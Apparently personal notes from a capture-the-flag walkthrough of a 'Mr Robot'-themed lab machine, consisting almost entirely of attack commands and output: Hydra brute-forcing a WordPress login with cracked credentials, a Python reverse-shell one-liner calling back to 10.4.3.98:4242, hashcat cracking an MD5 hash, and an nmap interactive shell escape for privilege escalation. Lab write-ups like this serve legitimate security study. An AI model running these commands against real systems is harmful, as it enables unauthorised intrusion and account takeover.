### Gobuster get the login page and credential list

### Hydra for wp-admin account
```
hydra -L name -p 123456 $ip http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.45.120%2Fwp-admin%2F&testcookie=1:F=Invalid username" -V

[80][http-post-form] host: 10.10.45.120   login: Elliot   password: 123456

hydra -l Elliot -P fsocity.dic $ip http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.45.120%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V

ER28-0652
```

### Theme 404 reverse shell

### Python stable shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.3.98",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Horizontal Privilege Escalation
```
hashcat -a 0 -m 0 hash rockyou.txt
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

### Now we have the robot, Final Privilege Escalation
```
su robot
./linpeas.sh | tee linout.txt
nmap --interactive
nmap> !sh
```
